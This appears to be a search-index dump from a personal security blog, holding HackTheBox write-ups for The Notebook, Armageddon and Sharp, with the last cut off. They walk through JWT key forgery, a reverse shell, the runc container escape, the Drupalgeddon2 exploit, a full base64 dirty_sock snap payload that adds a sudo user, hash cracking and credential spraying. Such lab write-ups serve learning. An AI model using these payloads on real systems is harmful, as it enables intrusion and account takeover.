    "snippet": "Greetings everyone, it has been a few weeks since our last posts. You may (or may not) have already noticed, I changed the theme of our blog as this one looks more professional and less boring than the old Chirpy theme I had used. But the new theme switch is not the sole reason for this update.We all know that learning advanced English is an arduous journey, so recently I have read my colleagues’ writing tasks and, specifically, secret.club whose novel style has followed an intriguingly clinical tone. All of their posts are explicit, logical and consistent, which really inspires me to reevaluate and improve my English writing, or professional progress in particular. On that account, I decided to spend more time learning and practicing their style of writing. Perhaps, you can learn something from it too.In future releases, I am planning on doing some exercises in the Practical Reverse Engineering book of Bruce Dang in order to dig deeper into Windows kernel-level as well as understand its complex functionalities. It is undoubtedly time-consuming and interesting at the same time since I love reversing and being able to see my endeavors payoff.That’s all I wanted to say for now. Thanks for reading and see you in other posts."
  },
  
  {
    "title": "HackTheBox - The Notebook",
    "url": "/blog/en/posts/HTB-TheNotebook/",
    "categories": "hackthebox",
    "tags": "hackthebox, network, pwn",
    "date": "2021-06-10 03:45:00 +0800",
    





    "snippet": "Welcome back to our usual HackTheBox journey, for today medium rated target - The Notebook. In this blog post, we’ve managed to alter client-side JWT cookie, spawn our reverse shell then proceeded to achieve user’s SSH credentials and, subsequently, be able to privesc via a docker PoC.EnumerationThe very initial step is to do a network scan using everyone’s favorite utility - nmap.┌──(kali㉿kali)-[~/HackTheBox/Boxes/TheNotebook]└─$ sudo nmap -sV -sC -sS 10.10.10.230 -p- -oA nmap/thenotebookStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 05:07 EDTNmap scan report for 10.10.10.230Host is up (0.034s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note KeeperService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.04 secondsNothing much to look at besides their Nginx server running on port 80, let’s display it in our browser.The webpage allows us to register an account and have some notes written.ExploitationJWT misconfigurationAt first I thought it was either RFI/LFI or XSS yet I couldn’t find any JavaScript objects to exploit. Later that I noticed there was a JWT1 cookie encoded with our basic login information and we want to change the justice flag admin_cap to True in order to have a more privileged access.The token is to be signed and verified with a RSA-256 private key stored on the server local host; therefore we somehow need to find or crack their secret signature though it might take thousands of years to decipher. Luckily, it is not necessary to do any of that since we can trick the server into signing tokens using our own private key. This is feasible due to the server failed to check for the integrity of its token issuers/authorities.Now, we need to create a new empty passphrase RSA256 private key (privKey.key) then start a HTTP server on port 7070 to host it.Change kid and admin_cap parameter correspondingly to our private key and True.Here is our JWT cookie:eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMDo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6ImxlZ2lhaHV5eSIsImVtYWlsIjoibGVnaWFodXl5QGVtYWlsLmNvbSIsImFkbWluX2NhcCI6dHJ1ZX0.EUtQ8LSlpMzKseLGJLVZhKrQoJSbD_BHYhAxuLjvZrKIBGjrzVqxjFnq2OuaBXCkkScsaPvKOBnp_f9LZ5hiRKOPP_N_5E5w2cv1FX_elhEjQe0Y7UWr9BdzWexzzObsaaM_wuF9PR3ydyAc86eg2iI6RXNuWPdv2PYrSsNYWgcF7_Y8QhSMX9nU4UjAQyutziAz-K-Q7eVhQvPubyDYB3cOIl_4Vzw5Jap4W0RvjzrPEQhELHiIO2tcwjqk9_6tZZdaLXYVmn616Ln2WFMXrW1-LaeAPfb5jHBJ1O9r4V35M3tIt7txlimqi116MBmXy4UZUMq0Z0XxLxtO9M070EuzvZwNJea-zZpOBRDMjzxmdDDG-2rOUXuUZDfX2cEGaOgXaudgCAEQZyXTQPGAbND5kf5DMuIKiWTXjokwYeqyOFXLNNmFFYWT1MY-ajEUOorG4WMhVDAZFBzGtJ_Wz75UxOeUl-jYqGyHL99BEwK_ysZtIeLnMoQ1DQcz9CRdcwZymZACk049RAp__SDzzM25tc8TlNzkyuUM0jV6xYTEJ1RqLJ_S0B2TgOLJ6kBYUjy7NdAj9d222mYkDCdxX9HM1rSJ5OdPPE11VqQFwdc-8kgsxjKvIQfXrkHyOHo8kQ8FwweGJR649ebIPsLJ__vmhJB8dNejsKaB4lRuaK0Pass the poisoned cookie to Burp then forward it will let us access to Admin Panel and other notes on the server.Most of the notes were gibberish and payloads from our XSS stage, although some of them mentioned about PHP files being executed unrestrictedly and a user named noah kept talking about backups.The Admin Panel allows us to upload anything we want; however, the upload folder (/var/www/html), and all the contents or objects therein, will be deleted and cleanup after approximately every 5 minutes. Because of that reason, we cannot use our elegant web-based p0wny2 shell for long and have to use the legacy netcat connection.The legendary called ‘backups’Running LinPEAS  as www-data also provides us with the location of the aforementioned backups.Notable ones are home.tar.gz, passwd.bak and shadow.bak yet I find the latter two only contain some unusable hashes. Extracting the home.tar.gz archive is far more interesting as it has noah’s SSH credentials.# Tar extraction command$ tar xzvf ./var/backups/home.tar.gz -C ./tmp/keyDownload and use id_rsa from noah’s backups will let us ssh into the server and read his user flag.Privilege EscalationLet have a glance at what noah can do.We can execute /usr/bin/docker exec -it webapp-dev01* as superuser. You can see that I also ran a sudo --version since it is a practical point to check sudo version for low hanging fruit even in these medium boxes just to be certain.And while doing a Google search about docker, we came across CVE-2019-5736, which related to this box situation.Here is a brief information about the vulnerability.  runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.  Read moreFortunately, we have the PoC of this vulnerability available on GitHub as well.https://github.com/Frichetten/CVE-2019-5736-PoCSince today post is not about programming, we will not have any in-depth discussion of how these golang lines are functioning. Basically, the PoC instance running in previously mentioned vulnerable docker then escapes and enables us to execute anything as a root user.So then we just need to clone the repository and edit main.go’s payload to create a privileged shell back to our host machine.In case you haven’t install golang, run the following lines:# First, install the package$ sudo apt install -y golang# Then add the following to your .bashrcexport GOROOT=/usr/lib/goexport GOPATH=$HOME/goexport PATH=$GOPATH/bin:$GOROOT/bin:$PATH# Reload your .bashrc$ source .bashrc# Build our crafted PoC$ go build main.go# output saved as $(pwd)/mainthen send our exploit to the target machine and execute these command:# Open a docker environment$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash# Run the PoC in docker$ chmod +x ./main &amp;amp;&amp;amp; ./main# Outside docker - noah session$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/shand finally we achieve our root.txt.Footnotes            https://jwt.io/introduction &amp;#8617;              https://github.com/flozz/p0wny-shell/blob/master/shell.php &amp;#8617;      "
  },
  
  {
    "title": "HackTheBox - Armageddon",
    "url": "/blog/en/posts/HTB-Armageddon/",
    "categories": "hackthebox",
    "tags": "hackthebox, network, pwn",
    "date": "2021-05-28 03:45:00 +0800",
    





    "snippet": "This is another challenge on HackTheBox - Armageddon. Let’s get started.EnumerationNmapWe start by enumerating open ports and services on the target machine using nmap:┌──(root💀kali)-[/home/kali/HackTheBox/Armageddon]└─# cat nmap/armageddon.nmap # Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233Nmap scan report for 10.10.10.233Host is up (0.23s latency).Not shown: 65219 closed ports, 314 filtered portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: |   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D|_http-generator: Drupal 7 (http://drupal.org)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Welcome to  Armageddon |  ArmageddonRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu May 27 01:24:56 2021 -- 1 IP address (1 host up) scanned in 3538.09 secondsThere are two open ports which are SSH on 22 and Apache web server on 80. The OpenSSH is usually not exploitable so we should focus on its web server.The homepage includes a login form and allows us to create new accounts but it seems to be not working as the new account needs to get approval from the administrator. Also, the request new password feature is only available for existing users.GoBusterI decide to use gobuster to try finding more accessible objects on the web server. These results are most likely to give us a hint about what we have to do next.┌──(root💀kali)-[/home/kali/HackTheBox/Armageddon]└─# gobuster dir -q -u http://10.10.10.233/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50 -o gobuster.txt/index.php            (Status: 200) [Size: 7440]/misc                 (Status: 301) [Size: 233] [--&amp;gt; http://10.10.10.233/misc/]/themes               (Status: 301) [Size: 235] [--&amp;gt; http://10.10.10.233/themes/]/modules              (Status: 301) [Size: 236] [--&amp;gt; http://10.10.10.233/modules/]/scripts              (Status: 301) [Size: 236] [--&amp;gt; http://10.10.10.233/scripts/]/sites                (Status: 301) [Size: 234] [--&amp;gt; http://10.10.10.233/sites/]  /includes             (Status: 301) [Size: 237] [--&amp;gt; http://10.10.10.233/includes/]/install.php          (Status: 200) [Size: 3172]                                   /profiles             (Status: 301) [Size: 237] [--&amp;gt; http://10.10.10.233/profiles/]/update.php           (Status: 403) [Size: 4057]                                   /README.txt           (Status: 200) [Size: 5382]                                   /robots.txt           (Status: 200) [Size: 2189]                                   /cron.php             (Status: 403) [Size: 7388]                                   /INSTALL.txt          (Status: 200) [Size: 17995]                                  /LICENSE.txt          (Status: 200) [Size: 18092]                                  /CHANGELOG.txt        (Status: 200) [Size: 111613]                                 /xmlrpc.php           (Status: 200) [Size: 42]                                     /COPYRIGHT.txt        (Status: 200) [Size: 1481]  ...ExploitationAfter some glances through all the folders and files, I bump into some information about Drupal.As in the README.txt and their website, Drupal is simply an open-source CMS platform. This revealed Drupal to be our exploit target but we have to know about the version of Drupal the machine is using.And we can get it by reading Changelog.txt:So the version is 7.56, while searching on Google about its vulnerability, I found this Github repo would provide us a handy boost.Reverse shell with Drupalgeddon2Some brief information about CVE-2018-7600/SA-CORE-2018-002 and you can learn more about it here.  To provide some background, Drupal’s Form API was introduced in Drupal 6 and allowed alteration of the form data during the form rendering process. This revolutionized the way markup processing was done.  In Drupal 7 the Form API was generalized to what is now known as Renderable Arrays. This extended API is used to represent the structure of most of the UI elements in Drupal, such as pages, blocks, nodes and more.Basically it tampers malfunctioned data into the form and abuses the rendering markup process to achieve RCE.That’s all about the concept and definition, let’s just use the automated script to exploit the target machine. $ ruby drupalgeddon2.rb 10.10.10.233  And we get our RCE endpoint at http://armageddon.htb/shell.php?c=&amp;lt;command&amp;gt;. Since the shell from Drupalgeddon2 is not flexible so I upload another one that includes a superb UI - p0wny-shell.Getting user-level credentials via MySQLInspecting ./sites/default/settings.php gives us our credential for the MySQL database running on the machine’s local host.$databases = array (  &#39;default&#39; =&amp;gt;  array (    &#39;default&#39; =&amp;gt;    array (      &#39;database&#39; =&amp;gt; &#39;drupal&#39;,      &#39;username&#39; =&amp;gt; &#39;drupaluser&#39;,      &#39;password&#39; =&amp;gt; &#39;CQHEy@9M*m23gBVj&#39;,      &#39;host&#39; =&amp;gt; &#39;localhost&#39;,      &#39;port&#39; =&amp;gt; &#39;&#39;,      &#39;driver&#39; =&amp;gt; &#39;mysql&#39;,      &#39;prefix&#39; =&amp;gt; &#39;&#39;,    ),  ),);Using above credentials to list all tables in the drupal database and users is the most conspicuous one here.Let’s dump all data in the users table with following command:$ mysql --user=drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e &#39;select name,pass from users;&#39;And we have it as brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt.Next we want to use hashid to identify the hash type then pass it to hashcat to crack it.┌──(kali㉿kali)-[~/HackTheBox/Armageddon]└─$ echo -n &#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&#39; | sudo tee brucetherealadmin.hash$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt                   ┌──(kali㉿kali)-[~/HackTheBox/Armageddon]└─$ hashid brucetherealadmin.hash--File &#39;brucetherealadmin.hash&#39;--Analyzing &#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&#39;[+] Drupal &amp;gt; v7.x --End of file &#39;brucetherealadmin.hash&#39;--                                                                          ┌──(kali㉿kali)-[~/HackTheBox/Armageddon]└─$ sudo hashcat -a 3 -m 7900 brucetherealadmin.hash /usr/share/wordlists/rockyou.txt  Finally, we acquired the password brucetherealadmin:boobooPrivilege EscalationWe are now able to ssh into 10.10.10.233 using the newly obtained credentials and grab our user flag. I also tried login as brucetherealadmin on the webpage but found nothing that worth attention.[brucetherealadmin@armageddon ~]$ lsuser.txt[brucetherealadmin@armageddon ~]$ cat user.txt 9583f911b01bfc2c80d1216707XXXXXX[brucetherealadmin@armageddon ~]$ In this escalation phase, first we need to know what brucetherealadmin can do.We are able to run /usr/bin/snap install * as superuser. We also have snap’s version as following:[brucetherealadmin@armageddon ~]$ snap versionsnap    2.47.1-1.el7snapd   2.47.1-1.el7series  16centos  7kernel  3.10.0-1160.6.1.el7.x86_64After a quick search about snapcraft, this will help us exploit and do a privesc. They also have a TL;DR for us to understand the vulnerability.  snapd serves up a REST API attached to a local UNIX_AF socket. Access control to restricted API functions is accomplished by querying the UID associated with any connections made to that socket. User-controlled socket peer data can be affected to overwrite a UID variable during string parsing in a for-loop. This allows any user to access any API functionDescribe in basic terms, snapd service allows attacker to add a new user with sudo privilege, in this case is dirty_sock:dirty_sock, by installing our malicious .snap package.Let’s reproduce the PoC code as below:$ python3 -c &quot;print((&#39;&#39;&#39;                                                                    130 ⨯aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;               + &#39;A&#39; * 4256 + &#39;==&#39;))&quot; | base64 -d | tee poc.snap$ sudo snap install poc.snapRun the code then do a check in /etc/passwd to see whether our exploit works.Switch to dirty_sock with dirty_sock as password and spawn our root shell then achieve the machine flag."
  },
  
  {
    "title": "HackTheBox - Sharp",
    "url": "/blog/en/posts/HTB-Sharp/",
    "categories": "hackthebox",
    "tags": "hackthebox, network, pwn",
    "date": "2021-05-16 03:45:00 +0800",
    





    "snippet": "Hi, after a long time not posting anything on this blog because of my university workload. Let’s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) machine - Sharp, which is rated 4.8 pts.For anyone who doesn’t know about HTB, it’s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.EnumerationOn the very first step, we want to do a nmap scan on the target (10.10.10.219).Nmap output# Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219Nmap scan report for 10.10.10.219Host is up (0.23s latency).Not shown: 996 filtered portsPORT     STATE SERVICE            VERSION135/tcp  open  msrpc              Microsoft Windows RPC139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds?8888/tcp open  storagecraft-image StorageCraft Image ManagerService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -48m56s| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-05-13T08:54:52|_  start_date: N/ARead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done at Thu May 13 05:44:27 2021 -- 1 IP address (1 host up) scanned in 133.29 secondsNmap results provide us with different ports and services currently running on the remote host. However, we probably should focus on its SMB service.In-depth enumeration with CrackMapExec (CME)Instead of the old-fashioned Metasploit’s auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line$ apt-get install crackmapexecor you can have it by cloning into byt3bl33d3r/CrackMapExec but you will need Poetry to manage dependencies.OS versionNow, let’s check our target’s OS version using CME (Windows 10.0 Build 17763 x64).┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219         SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)Shared objects &amp;amp; AccessNext, I’d like to login using empty username and password, a null-session, to get some free share-objects on the machine.┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u &#39;&#39; -p &#39;&#39; --shares  SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [-] Sharp\\: STATUS_ACCESS_DENIED SMB         10.10.10.219    445    SHARP            [+] Enumerated sharesSMB         10.10.10.219    445    SHARP            Share           Permissions     RemarkSMB         10.10.10.219    445    SHARP            -----           -----------     ------SMB         10.10.10.219    445    SHARP            ADMIN$                          Remote AdminSMB         10.10.10.219    445    SHARP            C$                              Default shareSMB         10.10.10.219    445    SHARP            dev                             SMB         10.10.10.219    445    SHARP            IPC$                            Remote IPCSMB         10.10.10.219    445    SHARP            kanban          READ            The most notable one here is the kanban share-directory because we don’t know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.Spider_plus JSONAnother thing you can do with CME is using its modules, in this case is spider_plus to crawl information from target host (directories, file names, sizes, …) and save it as JSON under /tmp/cme_spider_plus.┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u &#39;&#39; -p &#39;&#39; -M spider_plus SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [-] Sharp\\: STATUS_ACCESS_DENIED SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: [&#39;print$&#39;]SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plusSo organized, isn’t it?These are all the items we can enumerate with a null-session.Kanban share filesUsing smbclient to connect to kanban directory on remote machine and download files back to our Linux.# Connect to remote host with null credentials$ smbclient -N //10.10.10.219/kanban# Download all existing filessmb: \\&amp;gt; mget *You might want to take a look at those .pk3 and PortableKanban.exe files as aforementioned, they are likely to contain useful information.After downloading, you can extract the pkb.zip using unzip.┌──(root💀kali)-[/home/…/Sharp/smb/kanban/pkb]└─# unzip pkb.zip     Archive:  pkb.zip  inflating: CommandLine.dll           inflating: CsvHelper.dll             inflating: DotNetZip.dll             inflating: Itenso.Rtf.Converter.Html.dll    inflating: Itenso.Rtf.Interpreter.dll    inflating: Itenso.Rtf.Parser.dll     inflating: Itenso.Sys.dll            inflating: MsgReader.dll             inflating: Ookii.Dialogs.dll          creating: Plugins/  inflating: Plugins/PluginsLibrary.dll    inflating: PortableKanban.Data.dll    inflating: PortableKanban.exe        inflating: PortableKanban.Extensions.dll    inflating: ServiceStack.Common.dll    inflating: ServiceStack.Interfaces.dll    inflating: ServiceStack.Redis.dll    inflating: ServiceStack.Text.dll     inflating: User Guide.pdf  ┌──(kali㉿kali)-[~/HackTheBox/Sharp/smb/kanban]└─$ md5sum PortableKanban.pk*0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk30e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5   Skim through the files and we have these users in PortableKanban.pk3./* PortableKanban.pk3 */  &quot;Users&quot;: [    {      &quot;Id&quot;: &quot;e8e29158d70d44b1a1ba4949d52790a0&quot;,      &quot;Name&quot;: &quot;Administrator&quot;,      &quot;Initials&quot;: &quot;&quot;,      &quot;Email&quot;: &quot;&quot;,      &quot;EncryptedPassword&quot;: &quot;k+iUoOvQYG98PuhhRC7/rg==&quot;, // Base64      &quot;Role&quot;: &quot;Admin&quot;,      &quot;Inactive&quot;: false,      &quot;TimeStamp&quot;: 637409769245503700    },    {      &quot;Id&quot;: &quot;0628ae1de5234b81ae65c246dd2b4a21&quot;,      &quot;Name&quot;: &quot;lars&quot;,      &quot;Initials&quot;: &quot;&quot;,      &quot;Email&quot;: &quot;&quot;,      &quot;EncryptedPassword&quot;: &quot;Ua3LyPFM175GN8D3+tqwLA==&quot;,      &quot;Role&quot;: &quot;User&quot;,      &quot;Inactive&quot;: false,      &quot;TimeStamp&quot;: 637409769265925600    }  ]Reveal administrator password by re-configurating Kanban PK3 fileSince the passwords are encrypted, we need to find other ways to get in. We can abuse their own PortableKanban.exe to decrypt passwords for us since they are stored offline but you’ve might already known that only privileged users can read the password in plain text. Let’s add ourselves in with Admin role by copy-paste Administrator section and change the name and id./* PortableKanban.pk3 */	&quot;Users&quot;: [    {      &quot;Id&quot;: &quot;e8e29158d70d44b1a1ba4949d52790a0&quot;,      &quot;Name&quot;: &quot;Administrator&quot;,      &quot;Initials&quot;: &quot;&quot;,      &quot;Email&quot;: &quot;&quot;,      &quot;EncryptedPassword&quot;: &quot;k+iUoOvQYG98PuhhRC7/rg==&quot;,      &quot;Role&quot;: &quot;Admin&quot;,      &quot;Inactive&quot;: false,      &quot;TimeStamp&quot;: 637409769245503700    },    {      &quot;Id&quot;: &quot;0628ae1de5234b81ae65c246dd2b4a21&quot;,      &quot;Name&quot;: &quot;lars&quot;,      &quot;Initials&quot;: &quot;&quot;,      &quot;Email&quot;: &quot;&quot;,      &quot;EncryptedPassword&quot;: &quot;Ua3LyPFM175GN8D3+tqwLA==&quot;,      &quot;Role&quot;: &quot;User&quot;,      &quot;Inactive&quot;: false,      &quot;TimeStamp&quot;: 637409769265925600    },    {      &quot;Id&quot;: &quot;e8e29158d70d44b1a1ba4949d52790a1&quot;, // We also have to change the id      &quot;Name&quot;: &quot;huy&quot;,      &quot;Initials&quot;: &quot;&quot;,      &quot;Email&quot;: &quot;&quot;,      &quot;EncryptedPassword&quot;: &quot;&quot;, 					// Empty password      &quot;Role&quot;: &quot;Admin&quot;,      &quot;Inactive&quot;: false,      &quot;TimeStamp&quot;: 637409769245503700    }  ]Then we execute PortableKanban.exe, open Users tab in the setup dialog and we are now able to read the passwords.Alternative methodIf you love doing thing the-hard-way, feel free to reverse the program and reproduce its decrypt method. Luckily, PortableKanban.exe and its components are compiled in C# which makes it easier for us.Finding credentials with dnSpyLoad the target’s executables and DLLs  in dnSpy, we can have their decrypt method. The Decrypt function reads encrypted string as input, then uses DESCryptoServiceProvider with hardcoded key and IV to decrypt our string.On line 62 and 65, from two magic bytes called _rgbKey and _rgbIV:		// Token: 0x04000001 RID: 1		private static byte[] _rgbKey = Encoding.ASCII.GetBytes(&quot;7ly6UznJ&quot;); // Hex: 376c7936557a6e4a		// Token: 0x04000002 RID: 2		private static byte[] _rgbIV = Encoding.ASCII.GetBytes(&quot;XuVUm5fR&quot;);	// Hex: 587556556d356652Talk a little about DES cipher, people use two common mode which are CBC (cipher block chaining) and ECB (electronic code book). But only CBC supports key and IV in combination to generate the block cipher.So we are able to decrypt the password using CyberChef with the following recipe will give us our plain password.Credentials spraying with CMEIn this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.# users.txt                   larsAdministrator                                                                                                    # passwords.txt G123HHrth234gRGG2@$btRSHJYTarg┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\\lars:G123HHrth234gRG Only lars can log in so we should excluded Administrator credentials for now.Credentials acquired            Username      Password      Status                  Administrator      G2@$btRSHJYTarg      Invalid              lars      G123HHrth234gRG      Valid      User-level accessAfter using lars credentials, we are able to crawl his shared-objects with spider_plus module as following:┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     2 ⨯SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\\lars:G123HHrth234gRG SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: [&#39;print$&#39;]SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plusWe made the .json more readable by filtering out the time and file size.┌──(root💀kali)-[/home/kali/HackTheBox/Sharp]└─# cat 10.10.10.219_lars_spider.json | grep -v &#39;time\\|size&#39; | grep &#39;: {&#39; | awk -F\\&quot; &#39;{print $2}&#39;  IPC$			# directoryInitShutdownLSM_API_servicePIPE_EVENTROOT\\\\CIMV2SCM EVENT PROVIDERPSHost.132655164003465770.3392.DefaultAppDomain.powershellW32TIME_ALTWinsock2\\\\CatalogChangeListener-154-0Winsock2\\\\CatalogChangeListener-1dc-0Winsock2\\\\CatalogChangeListener-268-0Winsock2\\\\CatalogChangeListener-274-0Winsock2\\\\CatalogChangeListener-36c-0Winsock2\\\\CatalogChangeListener-42c-0atsvcepmappereventloglsassntsvcsscerpcsrvsvcvgauth-servicewkssvcdev				# directoryClient.exeRemotingLibrary.dllServer.exenotes.txtWhile searching lars files, only those in \\\\dev seem important.┌──(root💀kali)-[/home/…/HackTheBox/Sharp/smb/lars]└─# smbclient -U &#39;lars&#39; //10.10.10.219/dev G123HHrth234gRG                                    130 ⨯Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls  .                                   D        0  